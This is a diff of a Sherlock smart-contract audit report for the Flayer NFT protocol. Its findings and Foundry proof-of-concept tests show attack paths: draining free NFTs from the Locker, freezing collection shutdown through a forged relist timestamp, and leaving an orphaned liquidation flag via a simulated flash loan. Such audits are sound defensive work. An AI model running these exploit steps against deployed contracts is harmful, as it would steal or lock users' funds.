-- 1 FLOOR PRICE NFT = 1 Collection Token (this is especially clear from the logic of the listing, where the user specifies floorMultiple - how many tokens above the floor they should be paid for their NFT, however, they are guaranteed to receive `1 collection token` when sold)
-
-The attack, the essence of which will be described below, allows an attacker to take all free NFTs from the locker for just 1 NFT and a relatively small number of tokens to cover the commission, putting them up for sale. Thus, as a result of this attack, the following will happen.
-
-n - number of free NFTs on the `Locker` contract
-
-- The attacker, using 1 + n * listing_tax collection tokens, can earn n + 1 tokens in one transaction
-- All free NFTs of the `Locker` contract will be withdrawn and put up for sale, which means the `redeem` functionality allowing to quickly exchange their NFT for `1 Collection Token` will be unavailable.
-
-## Vulnerability Detail
-
-So, let's describe the attack scenario.
-
-Let's say there are `n` free NFTs currently on the `Locker` contract.
-
-Let's say the attacker has one NFT and `n * listing_tax collection tokens`.
-
-Then the attacker only needs to do the following:
-
-1. List their NFT for sale in `Listings` by calling `CreateListings`, paying `listing_tax` (user NFTs = 0, free NFTs = n)
-2. As mentioned above, `CreateListings` returns `1 Collection Token` to the user in the same transaction
-3. In the same transaction, the user withdraws 1 free NFT from `Locker`, exchanging it for the token received from `CreateListings` (user NFTs = 1, free NFTs = n - 1)
-4. Go back to step 1.
-
-At the end, the state will be as follows. (user NFTs on sell = n + 1, free NFTs = 0)
-
-If in
-
-If in the normal behavior of the protocol, `1 free NFT` would be exchanged for `1 Collection token` which would be burned, then in the case of an attack, this is simply an easy way for the attacker to enrich themselves (tokens that in a normal scenario would simply be burned, reducing totalSupply and driving up the price of tokens, as a result of the attack are simply redistributed to the attacker's wallet from other users). Moreover, this also breaks one of the protocol's functionalities - `Locker::redeem`
-
-## Impact
-
-The possibility of this attack in the Flayer protocol is in many ways similar to the possibility of a Sandwich attack in Uniswap. (It also harms the protocol's economy, moreover, it blocks the functionality of quickly exchanging NFT for 1 token).
-
-However, the Sandwich attack is possible due to the structure of the EVM, while this attack is due to shortcomings in the current economic model/implementation.
-
-Severity: High
-
-## Code Snippet
-https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/Listings.sol#L130
-
-## Tool used
-
-Manual Review
-
-## Recommendation
-
-Perhaps the simplest way to avoid this problem is to not return 1 token to the user during createListings, but only when the listing is realized.
 
 # Issue M-1: Previous `beneficiary` will not be able to claim `beneficiaryFees` if current beneficiary is a pool 
 
@@ -2346,380 +3418,7 @@ Manual Review
 
 Should not allow arbitrary user to redeem/swap the airdropped item.
 
-# Issue M-4: In the `Listings.sol#relist()` function, `listing.created` is not set to `block.timestamp`. 
-
-Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/164 
-
-## Found by 
-0xAlix2, Ollam, ZeroTrust, araj, blockchain555, cawfree, cnsdkc007, dany.armstrong90, h2134, jecikpo, ydlee, zraxx, zzykxx
-### Summary
-
-The core functionality of the protocol can be blocked by malicious users by not setting `listing.created` to `block.timestamp` in the [`Listings.sol#relist()`](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/Listings.sol#L625-L672) function.
-
-
-### Root Cause
-
-In the `Listings.sol#relist()` function, `listing.created` is not set to `block.timestamp` and it is determined based on the input parameter.
-
-
-### Internal pre-conditions
-
-_No response_
-
-### External pre-conditions
-
-- When a collection is illiquid and we have a disperate number of tokens spread across multiple  users, a pool has to become unusable.
-
-
-### Attack Path
-
-- In [`Listings.sol#L665`](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/Listings.sol#L665), a malicious user sets `listing.created` to `type(uint).max` instead of `block.timestamp` in the `Listings.sol#relist()` function.
-- Next, When a collection is illiquid and we have a disperate number of tokens spread across multiple  users, a pool has to become unusable.
-- In [`CollectionShutdown.sol#L241`](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/utils/CollectionShutdown.sol#L241), [`_hasListings(_collection)`](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/utils/CollectionShutdown.sol#L497-L514 ) is always `true`, so the `CollectionShutdown.sol#execute()` function is always reverted.
-
-
-### Impact
-
-The CollectionShutdown function that is core function of the protocol is damaged.
-
-### PoC
-
-```solidity
-function test_CanRelistFloorItemAsLiquidListing(address _lister, address payable _relister, uint _tokenId, uint16 _floorMultiple) public {
-        // Ensure that we don't get a token ID conflict
-        _assumeValidTokenId(_tokenId);
-
-        // Ensure that we don't set a zero address for our lister and filler, and that they
-        // aren't the same address
-        _assumeValidAddress(_lister);
-        _assumeValidAddress(_relister);
-        vm.assume(_lister != _relister);
-
-        // Ensure that our listing multiplier is above 1.00
-        _assumeRealisticFloorMultiple(_floorMultiple);
-
-        // Provide a token into the core Locker to create a Floor item
-        erc721a.mint(_lister, _tokenId);
-
-        vm.startPrank(_lister);
-        erc721a.approve(address(locker), _tokenId);
-
-        uint[] memory tokenIds = new uint[](1);
-        tokenIds[0] = _tokenId;
-
-        // Rather than creating a listing, we will deposit it as a floor token
-        locker.deposit(address(erc721a), tokenIds);
-        vm.stopPrank();
-
-        // Confirm that our listing user has received the underlying ERC20. From the deposit this will be
-        // a straight 1:1 swap.
-        ICollectionToken token = locker.collectionToken(address(erc721a));
-        assertEq(token.balanceOf(_lister), 1 ether);
-
-        vm.startPrank(_relister);
-
-        // Provide our filler with sufficient, approved ERC20 tokens to make the relist
-        uint startBalance = 0.5 ether;
-        deal(address(token), _relister, startBalance);
-        token.approve(address(listings), startBalance);
-
-        // Relist our floor item into one of various collections
-        listings.relist({
-            _listing: IListings.CreateListing({
-                collection: address(erc721a),
-                tokenIds: _tokenIdToArray(_tokenId),
-                listing: IListings.Listing({
-                    owner: _relister,
--->                 created: uint40(type(uint32).max),
-                    duration: listings.MIN_LIQUID_DURATION(),
-                    floorMultiple: _floorMultiple
-                })
-            }),
-            _payTaxWithEscrow: false
-        });
-
-        vm.stopPrank();
-
-        // Confirm that the listing has been created with the expected details
-        IListings.Listing memory _listing = listings.listings(address(erc721a), _tokenId);
-
-        assertEq(_listing.created, block.timestamp);
-    }
-```
-
-Result:
-```solidity
-Ran 1 test suite in 17.20ms (15.77ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)
-
-Failing tests:
-Encountered 1 failing test in test/Listings.t.sol:ListingsTest
-[FAIL. Reason: assertion failed: 4294967295 != 3601; counterexample: calldata=0x102a3f2c0000000000000000000000007b71078b91e0cdf997ea0019ceaaec1e461a64ca0000000000000000000000000a255597a7458c26b0d008204a1336eb2fd6aa090000000000000000000000000000000000000000000000000005c3b7d197caff000000000000000000000000000000000000000000000000000000000000006d args=[0x7b71078b91E0CdF997EA0019cEaAeC1E461A64cA, 0x0A255597a7458C26B0D008204A1336EB2fD6AA09, 1622569146370815 [1.622e15], 109]] test_CanRelistFloorItemAsLiquidListing(address,address,uint256,uint16) (runs: 0, μ: 0, ~: 0)
-
-Encountered a total of 1 failing tests, 0 tests succeeded
-```
-
-
-### Mitigation
-
-Add the follow lines to the `Listings.sol#relist()` function:
-```solidity
-function relist(CreateListing calldata _listing, bool _payTaxWithEscrow) public nonReentrant lockerNotPaused {
-        // Load our tokenId
-        address _collection = _listing.collection;
-        uint _tokenId = _listing.tokenIds[0];
-
-        // Read the existing listing in a single read
-        Listing memory oldListing = _listings[_collection][_tokenId];
-
-        // Ensure the caller is not the owner of the listing
-        if (oldListing.owner == msg.sender) revert CallerIsAlreadyOwner();
-
-        // Load our new Listing into memory
-        Listing memory listing = _listing.listing;
-
-        // Ensure that the existing listing is available
-        (bool isAvailable, uint listingPrice) = getListingPrice(_collection, _tokenId);
-        if (!isAvailable) revert ListingNotAvailable();
-
-        // We can process a tax refund for the existing listing
-        (uint _fees,) = _resolveListingTax(oldListing, _collection, true);
-        if (_fees != 0) {
-            emit ListingFeeCaptured(_collection, _tokenId, _fees);
-        }
-
-        // Find the underlying {CollectionToken} attached to our collection
-        ICollectionToken collectionToken = locker.collectionToken(_collection);
-
-        // If the floor multiple of the original listings is different, then this needs
-        // to be paid to the original owner of the listing.
-        uint listingFloorPrice = 1 ether * 10 ** collectionToken.denomination();
-        if (listingPrice > listingFloorPrice) {
-            unchecked {
-                collectionToken.transferFrom(msg.sender, oldListing.owner, listingPrice - listingFloorPrice);
-            }
-        }
-
-        // Validate our new listing
-        _validateCreateListing(_listing);
-
-        // Store our listing into our Listing mappings
-        _listings[_collection][_tokenId] = listing;
-
-+++     _listings[_collection][_tokenId].created = uint40(block.timestamp);        
-
-        // Pay our required taxes
-        payTaxWithEscrow(address(collectionToken), getListingTaxRequired(listing, _collection), _payTaxWithEscrow);
-
-        // Emit events
-        emit ListingRelisted(_collection, _tokenId, listing);
-    }
-```
-
-# Issue M-5: Relisting Then Cancelling A Liquidation Auction Results In Losses On Subsequent Deposits 
-
-Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/185 
-
-## Found by 
-cawfree, kuprum
-## Summary
-
-Relisting a token undergoing dutch auction risks erroneously persisting an orphaned `isLiquidation` state flags on the token, resulting in loss of due harberger taxes and refunds when the token is relisted.
-
-## Vulnerability Detail
-
-In the following sequence, we protect, liquidate, relist and finally cancel a listing for an underlying token.
-
-Once the sequence is finished, all value is conserved and the underlying token is back in the hands of the original owner - however we have managed to erroneously persist an `isLiquidation` flag against the underlying token, even though it is no longer undergoing liquidation.
-
-### ProtectedListings.t.sol
-
-First, add the following test sequence to `ProtectedListings.t.sol`:
-
-```solidity
-function testSherlock_CreateOrphanedFlag() external returns (uint256[] memory tokenIds) {
-
-    // 0. Assume a flashloan address:
-    address flashloan = address(0xf1a510a9);
-    uint256 numberOfFlashloanTokens = 10;
-    vm.startPrank(flashloan);
-    {
-        tokenIds = new uint256[](numberOfFlashloanTokens);
-        for (uint256 i = 0; i < numberOfFlashloanTokens; i++) erc721a.mint(flashloan, tokenIds[i] = 10_000 + i);
-        erc721a.setApprovalForAll(address(locker), true);
-        locker.deposit(address(erc721a), tokenIds);
-    }
-    vm.stopPrank();
-
-    assertEq(locker.collectionToken(address(erc721a)).balanceOf(flashloan), 10000000000000000000) /* Flashloan Initial Balance */;
-
-    // 1. `deadbeef` mints and protects their token:
-    address deadbeef = address(0xdeadbeef);
-    uint256 deadbeefTokenId = 100;
-    vm.startPrank(deadbeef);
-        erc721a.setApprovalForAll(address(protectedListings), true);
-        erc721a.mint(deadbeef, deadbeefTokenId);
-        tokenIds = new uint256[](1);
-        tokenIds[0] = deadbeefTokenId;
-        IProtectedListings.ProtectedListing memory listing = IProtectedListings.ProtectedListing({
-            owner: payable(deadbeef),
-            tokenTaken: 0.95 ether,
-            checkpoint: 0
-        });
-        _createProtectedListing({
-            _listing: IProtectedListings.CreateListing({
-                collection: address(erc721a),
-                tokenIds: tokenIds,
-                listing: listing
-            })
-        });
-    vm.stopPrank();
-    assertEq(locker.collectionToken(address(erc721a)).balanceOf(deadbeef), 950000000000000000) /* Deadbeef Balance After Deposit */;
-
-    // 2. Block is mined:
-    vm.roll(block.number + 1);
-    vm.warp(block.timestamp + 2);
-
-    // 3. Asset is now unhealthy.
-    assert(protectedListings.getProtectedListingHealth(address(erc721a), deadbeefTokenId) < 0) /* unhealthy */;
-
-    // 4. Start a liquidation:
-    vm.startPrank(deadbeef);
-        protectedListings.liquidateProtectedListing(address(erc721a), deadbeefTokenId);
-    vm.stopPrank();
-    assertEq(locker.collectionToken(address(erc721a)).balanceOf(deadbeef), 1000000000000000000) /* Deadbeef Liquidates Own Listing */;
-
-    // 5. `deadbeefOtherAccount` flash loans the required capital:
-    address deadbeefOtherAccount = address(0xdeadbeef + 1);
-    uint256 flashLoanAmount = 3000000000000000000 + 90000000000000000;
-    vm.startPrank(flashloan);
-        locker.collectionToken(address(erc721a)).transfer(deadbeefOtherAccount, flashLoanAmount);
-    vm.stopPrank();
-
-    assertEq(locker.collectionToken(address(erc721a)).balanceOf(flashloan), 6910000000000000000) /* Flash Loan Balance Reduced */;
-
-    // 6. Relist, masquerading as a different account:
-    vm.startPrank(deadbeefOtherAccount);
-        locker.collectionToken(address(erc721a)).approve(address(listings), type(uint256).max) /* Max Approve Listings */;
-
-        tokenIds = new uint256[](1);
-        tokenIds[0] = deadbeefTokenId;
-        listings.relist(
-            IListings.CreateListing({
-                collection: address(erc721a),
-                tokenIds: tokenIds,
-                listing: IListings.Listing({
-                    owner: payable(deadbeef),
-                    created: uint40(block.timestamp),
-                    duration: 7 days /* convert back into a liquid listing */,
-                    floorMultiple: 400
-                })
-            }),
-            false
-        );
-    vm.stopPrank();
-
-    // 7. Now the listing is no longer in dutch auction, cancel it:
-    vm.startPrank(deadbeef);
-        locker.collectionToken(address(erc721a)).approve(address(listings), type(uint256).max);
-        listings.cancelListings(address(erc721a), tokenIds, false);
-
-        // Repay the flash loan for deadbeef:
-        locker.collectionToken(address(erc721a)).transfer(flashloan, flashLoanAmount);
-
-        // Assert that value has been conserved (nothing has been lost):
-        assertEq(locker.collectionToken(address(erc721a)).balanceOf(deadbeef), 0);
-        assertEq(locker.collectionToken(address(erc721a)).balanceOf(deadbeefOtherAccount), 0);
-        assertEq(locker.collectionToken(address(erc721a)).balanceOf(flashloan), numberOfFlashloanTokens * 1 ether);
-
-        // Deadbeef is back in possession of the token:
-        assertEq(erc721a.ownerOf(deadbeefTokenId), deadbeef);
-
-    vm.stopPrank();
-
-}
-```
-
-Then add the following `console.log`s to `Listings.sol` to the end of [`cancelListings`](https://github.com/sherlock-audit/2024-08-flayer/blob/0ec252cf9ef0f3470191dcf8318f6835f5ef688c/flayer/src/contracts/Listings.sol#L414C14-L414C28):
-
-```diff
-// Create our checkpoint as utilisation rates will change
-protectedListings.createCheckpoint(_collection); /// @custom:hunter now we can call this arbitrarily since tehre are no throws
-+
-+ for (uint256 i = 0; i < _tokenIds.length; i++) {
-+    console.log("After cancellation, is still a liquidation?", _isLiquidation[_collection][_tokenIds[i]]);
-+ }
-+
-emit ListingsCancelled(_collection, _tokenIds);
-```
-
-And finally run using:
-
-```shell
-forge test --match-test "testSherlock_CreateOrphanedFlag" -vv
-```
-
-```shell
-Ran 1 test for test/ProtectedListings.t.sol:ProtectedListingsTest
-[PASS] testSherlock_CreateOrphanedFlag() (gas: 2248654)
-Logs:
-  After cancellation, is still a liquidation? true
-
-Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 8.49ms (2.00ms CPU time)
-```
-
-This confirms that it is possible to persist an `_isLiquidation` flag against a token which is no longer undergoing liquidation.
-
-## Impact
-
-An orphaned `_isLiquidation` flag persisted against a token can result in losses for a users and the protocol if it were to be deposited back into the system.
-
-This is because refunds for harberger taxes are only paid for the case where a token is specifically not marked as `_isLiquidation`:
-
-```solidity
-// Check if there is collateral on the listing, as this we bypass fees and refunds
-if (!_isLiquidation[_collection][_tokenId]) { /// @audit only pay refunds for tokens which aren't marked as liquidations
-    // Find the amount of prepaid tax from current timestamp to prepaid timestamp
-    // and refund unused gas to the user.
-    (uint fee, uint refund) = _resolveListingTax(_listings[_collection][_tokenId], _collection, false);
-    emit ListingFeeCaptured(_collection, _tokenId, fee);
-
-    assembly {
-        tstore(FILL_FEE, add(tload(FILL_FEE), fee))
-        tstore(FILL_REFUND, add(tload(FILL_REFUND), refund))
-    }
-} else {
-    delete _isLiquidation[_collection][_tokenId];
-}
-```
-
-```solidity
-// We can process a tax refund for the existing listing if it isn't a liquidation
-if (!_isLiquidation[_collection][_tokenId]) {
-    (uint _fees,) = _resolveListingTax(oldListing, _collection, true); /// @audit only realize refunds and fees if not a liquidation
-    if (_fees != 0) {
-        emit ListingFeeCaptured(_collection, _tokenId, _fees);
-    }
-}
-```
-
-This materializes as losses for both the user and the protocol.
-
-## Code Snippet
-
-## Tool used
-
-[**Shaheen Vision**](https://x.com/0x_Shaheen/status/1722664258142650806)
-
-## Recommendation
-
-In our proof of concept, we break the protocol invariant that a [dutch auction cannot be modified](https://github.com/sherlock-audit/2024-08-flayer/blob/0ec252cf9ef0f3470191dcf8318f6835f5ef688c/flayer/src/contracts/Listings.sol#L311C13-L312C98) by first converting it back into a liquid listing via a call to [`relist`](https://github.com/sherlock-audit/2024-08-flayer/blob/0ec252cf9ef0f3470191dcf8318f6835f5ef688c/flayer/src/contracts/Listings.sol#L625C14-L625C20).
-
-Since dutch auctions should not be modifiable, we recommend **rejecting attempts to relist them**, as this is a form of modification.
-
-In addition, ensure that the `_isLiquidation` flag is cleared when cancelling a listing.
-
-
-# Issue M-6: Admin can not set the pool fee since it is only set in memory 
+# Issue M-4: Admin can not set the pool fee since it is only set in memory 
 
 Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/188 
 
@@ -2774,53 +3473,287 @@ _No response_
 
 Use storage instead of memory for `poolParams` in [`setFee()`](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/implementation/UniswapImplementation.sol#L783-L793).
 
-# Issue M-7: `collectionLiquidationComplete()` can be DoS by directly transferring a collection NFT to the `sweeperPool` 
+# Issue M-5: `ERC1155Bridgable` is not EIP-1155 compliant 
 
-Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/209 
+Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/202 
 
 ## Found by 
-Audinarey, OpaBatyo, Sentryx, araj, cawfree, utsav
-## Summary
-`collectionLiquidationComplete()` can be DoS by directly transferring a collection NFT to the `sweeperPool`
+ComposableSecurity, Spearmint, kuprum
+### Summary
 
-## Vulnerability Detail
-When a user claim their ETH using claim(), it calls `collectionLiquidationComplete()` to check if all the NFT are liquidated in sudoswap pool or not.
+According to the [README](https://github.com/sherlock-audit/2024-08-flayer/blob/main/README.md#moongate-4):
+>  The Bridged1155 should be strictly  compliant with EIP-1155 and EIP-2981
+
+[EIP-1155](https://eips.ethereum.org/EIPS/eip-1155) states the following about `ERC1155Metadata_URI` extension:
+
+> The optional `ERC1155Metadata_URI` extension can be identified with the [ERC-165 Standard Interface Detection](https://eips.ethereum.org/EIPS/eip-165).
+>
+> If the optional `ERC1155Metadata_URI` extension is included:
+>
+> - The ERC-165 `supportsInterface` function MUST return the constant value `true` if `0x0e89341c` is passed through the `interfaceID` argument.
+> - Changes to the URI MUST emit the `URI` event if the change can be expressed with an event (i.e. it isn’t dynamic/programmatic).
+
+But we see that:
+- `ERC1155Bridgable` _does support_ the extension, and returns the required constant via [supportsInterface](https://github.com/sherlock-audit/2024-08-flayer/blob/main/moongate/src/libs/ERC1155Bridgable.sol#L140-L145)
+- It _does not emit_ the `URI` event as required, when it's changed via function [setTokenURIAndMintFromRiftAbove](https://github.com/sherlock-audit/2024-08-flayer/blob/main/moongate/src/libs/ERC1155Bridgable.sol#L92-L102):
+
 ```solidity
-function claim(address _collection, address payable _claimant) public nonReentrant whenNotPaused {
-...
-        // Ensure that all NFTs have sold from our Sudoswap pool
-@>      if (!collectionLiquidationComplete(_collection)) revert NotAllTokensSold();
-...
+function setTokenURIAndMintFromRiftAbove(uint _id, uint _amount, string memory _uri, address _recipient) external {
+    if (msg.sender != INFERNAL_RIFT_BELOW) {
+        revert NotRiftBelow();
+    }
+
+    // Set our tokenURI
+    uriForToken[_id] = _uri;
+
+    // Mint the token to the specified recipient
+    _mint(_recipient, _id, _amount, '');
+}
+```
+
+Notice that when bridging the ERC-1155 tokens, URIs are retrieved from the corresponding token contract by `InternalRiftAbove`, and encoded into the package [as follows](https://github.com/sherlock-audit/2024-08-flayer/blob/main/moongate/src/InfernalRiftAbove.sol#L158-L181):
+
+```solidity
+// Go through each NFT, set its URI and escrow it
+uris = new string[](numIds);
+for (uint j; j < numIds; ++j) {
+    // Ensure we have a valid amount passed (TODO: Is this needed?)
+    tokenAmount = params.amountsToCross[i][j];
+    if (tokenAmount == 0) {
+        revert InvalidERC1155Amount();
+    }
+
+    uris[j] = erc1155.uri(params.idsToCross[i][j]);
+    erc1155.safeTransferFrom(msg.sender, address(this), params.idsToCross[i][j], params.amountsToCross[i][j], '');
+}
+
+// Set up payload
+package[i] = Package({
+    chainId: block.chainid,
+    collectionAddress: collectionAddress,
+    ids: params.idsToCross[i],
+    amounts: params.amountsToCross[i],
+    uris: uris,
+    royaltyBps: _getCollectionRoyalty(collectionAddress, params.idsToCross[i][0]),
+    name: '',
+    symbol: ''
+});
+```
+
+I.e. the information is properly retrieved, transferred, and is available; but the `URI` event is not emitted as required; this breaks the specification.
+
+### Impact
+
+Protocols integrating with `ERC1155Bridgable` may work incorrectly.
+
+### Mitigation
+
+Compare the URI supplied for an NFT in function `setTokenURIAndMintFromRiftAbove`, and if it has changed -- emit the `URI` event as required per the specification.
+
+# Issue M-6: The unused tokens from the user’s initialization of UniswapV4‘s pool will be locked in the UniswapImplementation contract. 
+
+Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/208 
+
+## Found by 
+0x37, 0xHappy, 0xNilesh, 0xc0ffEE, 0xlucky, BADROBINX, BugPull, ComposableSecurity, Ironsidesec, KingNFT, Ollam, ZeroTrust, blockchain555, h2134, merlinboii, novaman33, shaflow01, wickie, zarkk01, zzykxx
+## Summary
+The unused tokens from the user’s initialization of UniswapV4‘s pool will be locked in the UniswapImplementation contract.
+## Vulnerability Detail
+```javascript
+ function initializeCollection(address _collection, uint _amount0, uint _amount1, uint _amount1Slippage, uint160 _sqrtPriceX96) public override {
+        // Ensure that only our {Locker} can call initialize
+        if (msg.sender != address(locker)) revert CallerIsNotLocker();
+
+        // Ensure that the PoolKey is not empty
+        PoolKey memory poolKey = _poolKeys[_collection];
+        if (poolKey.tickSpacing == 0) revert UnknownCollection();
+
+        // Initialise our pool
+        poolManager.initialize(poolKey, _sqrtPriceX96, '');
+
+        // After our contract is initialized, we mark our pool as initialized and emit
+        // our first state update to notify the UX of current prices, etc.
+        PoolId id = poolKey.toId();
+        _emitPoolStateUpdate(id);
+
+        // Load our pool parameters and update the initialized flag
+        PoolParams storage poolParams = _poolParams[id];
+        poolParams.initialized = true;
+
+        // Obtain the UV4 lock for the pool to pull in liquidity
+@>>        poolManager.unlock(
+            abi.encode(CallbackData({
+                poolKey: poolKey,
+                liquidityDelta: LiquidityAmounts.getLiquidityForAmounts({
+                    sqrtPriceX96: _sqrtPriceX96,
+                    sqrtPriceAX96: TICK_SQRT_PRICEAX96,
+                    sqrtPriceBX96: TICK_SQRT_PRICEBX96,
+                    amount0: poolParams.currencyFlipped ? _amount1 : _amount0,
+                    amount1: poolParams.currencyFlipped ? _amount0 : _amount1
+                }),
+                liquidityTokens: _amount1,
+                liquidityTokenSlippage: _amount1Slippage
+            })
+        ));
     }
 ```
-```solidity
-function collectionLiquidationComplete(address _collection) public view returns (bool) {
-...
-        // Check that all token IDs have been bought from the pool
-        for (uint i; i < sweeperPoolTokenIdsLength; ++i) {
-            // If the pool still owns the NFT, then we have to revert as not all tokens have been sold
-@>         if (collection.ownerOf(params.sweeperPoolTokenIds[i]) == sweeperPool) {
-                return false;
+This function calls UniswapV4’s poolManager.unlock().
+
+```javascript
+function unlock(bytes calldata data) external override returns (bytes memory result) {
+        if (Lock.isUnlocked()) AlreadyUnlocked.selector.revertWith();
+
+        Lock.unlock();
+
+        // the caller does everything in this callback, including paying what they owe via calls to settle
+@>>        result = IUnlockCallback(msg.sender).unlockCallback(data);
+
+        if (NonzeroDeltaCount.read() != 0) CurrencyNotSettled.selector.revertWith();
+        Lock.lock();
+    }
+```
+And in poolManager.unlock(), the unlockCallback() function of UniswapImplementation is called.
+```javascript
+function _unlockCallback(bytes calldata _data) internal override returns (bytes memory) {
+        // Unpack our passed data
+        CallbackData memory params = abi.decode(_data, (CallbackData));
+
+        // As this call should only come in when we are initializing our pool, we
+        // don't need to worry about `take` calls, but only `settle` calls.
+        (BalanceDelta delta,) = poolManager.modifyLiquidity({
+            key: params.poolKey,
+            params: IPoolManager.ModifyLiquidityParams({
+                tickLower: MIN_USABLE_TICK,
+                tickUpper: MAX_USABLE_TICK,
+                liquidityDelta: int(uint(params.liquidityDelta)),
+                salt: ''
+            }),
+            hookData: ''
+        });
+
+        // Check the native delta amounts that we need to transfer from the contract
+@>>        if (delta.amount0() < 0) {
+@>>            _pushTokens(params.poolKey.currency0, uint128(-delta.amount0()));
+        }
+
+        // Check our ERC20 donation
+@>>        if (delta.amount1() < 0) {
+@>>            _pushTokens(params.poolKey.currency1, uint128(-delta.amount1()));
+        }
+
+        // If we have an expected amount of tokens being provided as liquidity, then we
+        // need to ensure that this exact amount is sent. There may be some dust that is
+        // lost during rounding and for this reason we need to set a small slippage
+        // tolerance on the checked amount.
+        if (params.liquidityTokens != 0) {
+            uint128 deltaAbs = _poolParams[params.poolKey.toId()].currencyFlipped ? uint128(-delta.amount0()) : uint128(-delta.amount1());
+            if (params.liquidityTokenSlippage < params.liquidityTokens - deltaAbs) {
+                revert IncorrectTokenLiquidity(
+                    deltaAbs,
+                    params.liquidityTokenSlippage,
+                    params.liquidityTokens
+                );
             }
         }
 
-        return true;
+        // We return our `BalanceDelta` response from the donate call
+        return abi.encode(delta);
     }
 ```
-To check all NFTs are liquidated or not, it calls `ownerOf()`. Now the problem is a malicious user can buy a NFT of that collection and directly `transfer` it to the `Pool` address. As result, the above check will return `false`, which will revert the `claim()` ie permanently DoS the claim()
+In the above code, _pushTokens() transfers the required amounts of currency0 and currency1 (i.e., nativeToken and collectionToken) from the UniswapImplementation contract to the poolManager contract in UniswapV4.
 
+```javascript
+ function getLiquidityForAmounts(
+        uint160 sqrtPriceX96,
+        uint160 sqrtPriceAX96,
+        uint160 sqrtPriceBX96,
+        uint256 amount0,
+        uint256 amount1
+    ) internal pure returns (uint128 liquidity) {
+        if (sqrtPriceAX96 > sqrtPriceBX96) (sqrtPriceAX96, sqrtPriceBX96) = (sqrtPriceBX96, sqrtPriceAX96);
+
+        if (sqrtPriceX96 <= sqrtPriceAX96) {
+            liquidity = getLiquidityForAmount0(sqrtPriceAX96, sqrtPriceBX96, amount0);
+        } else if (sqrtPriceX96 < sqrtPriceBX96) {
+            uint128 liquidity0 = getLiquidityForAmount0(sqrtPriceX96, sqrtPriceBX96, amount0);
+            uint128 liquidity1 = getLiquidityForAmount1(sqrtPriceAX96, sqrtPriceX96, amount1);
+
+@>>            liquidity = liquidity0 < liquidity1 ? liquidity0 : liquidity1;
+        } else {
+            liquidity = getLiquidityForAmount1(sqrtPriceAX96, sqrtPriceBX96, amount1);
+        }
+    }
+```
+From LiquidityAmounts.getLiquidityForAmounts() in UniswapV4, we can see that the amounts of currency0 and currency1 might not be fully utilized, and one of the tokens will always have a leftover amount. 
+In the UniswapImplementation::_unlockCallback() function, there is no operation to return the leftover tokens to the msg.sender (i.e., the Locker). It only compares the leftover collectionToken with the liquidityTokenSlippage, and if the leftover collectionToken exceeds the liquidityTokenSlippage, the entire operation will revert.
+
+This only ensures that the remaining amount of collectionToken is within the user’s control. 
+However, the leftover tokens (either nativeToken or collectionToken) will remain permanently locked in the UniswapImplementation contract.
 ## Impact
-Claim() can be permanently DoS ie users will not be able to claim their ETH
-
+The user loses the leftover tokens.
 ## Code Snippet
-https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/utils/CollectionShutdown.sol#L295
-https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/utils/CollectionShutdown.sol#L461C1-L464C1
+https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/implementation/UniswapImplementation.sol#L205
+
+https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/implementation/UniswapImplementation.sol#L376
 
 ## Tool used
+
 Manual Review
 
 ## Recommendation
-Don't use ownerOf() as checking if all NFTs are liquidated or not, instead use any internal mechanism/ counting
+Add handling for refunding the leftover tokens.
+
+# Issue M-7: `ERC721Bridgable` and `ERC1155Bridgable` are not EIP-2981 compliant, and fail to correctly collect or attribute royalties to artists 
+
+Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/214 
+
+## Found by 
+Ruhum, h2134, kuprum, novaman33, rndquu, zzykxx
+### Summary
+
+According to the [README](https://github.com/sherlock-audit/2024-08-flayer/blob/main/README.md#moongate-4):
+
+> The Bridged721 should be strictly  compliant with EIP-721 and EIP-2981
+> The Bridged1155 should be strictly  compliant with EIP-1155 and EIP-2981
+
+[EIP-2981](https://eips.ethereum.org/EIPS/eip-2981) states the following:
+
+> Marketplaces that support this standard MUST pay royalties no matter where the sale occurred or in what currency, including on-chain sales, over-the-counter (OTC) sales and off-chain sales such as at auction houses. As royalty payments are voluntary, entities that respect this EIP must pay no matter where the sale occurred - a sale conducted outside of the blockchain is still a sale.
+
+The crux of the standard, is that if a contract is EIP-2981 compliant, the royalty _should be paid to the artist who created the NFT no matter where the sale occurred_. For that it first needs to be correctly _reported_ to marketplaces, and _attributed_ to the artist. It's worth noting that as returned by the EIP-2981 function `royaltyInfo`, **both the royalty recipient and the royalty amount are specific to each NFT**:
+
+```solidity
+function royaltyInfo(uint256 _tokenId, uint256 _salePrice) external view returns (address receiver, uint256 royaltyAmount);
+```
+
+The problem is that both `ERC721Bridgable` and `ERC1155Bridgable` completely violate this crucial property via **both setting a uniform royalty amount across all NFTs, and designating themselves as the royalty recipient**, thus reporting _wrong amounts_, and mixing them together in a _single bucket_. This makes it impossible to either correctly collect the appropriate royalty amounts, or to attribute the collected royalties to artists.
+
+### Root Cause
+
+Both [ERC721Bridgable](https://github.com/sherlock-audit/2024-08-flayer/blob/main/moongate/src/libs/ERC721Bridgable.sol#L81-L82) and [ERC1155Bridgable](https://github.com/sherlock-audit/2024-08-flayer/blob/main/moongate/src/libs/ERC1155Bridgable.sol#L63-L64) perform the following in their `initialize` function: 
+
+```solidity
+// Set this contract to receive marketplace royalty
+_setDefaultRoyalty(address(this), _royaltyBps);
+```
+
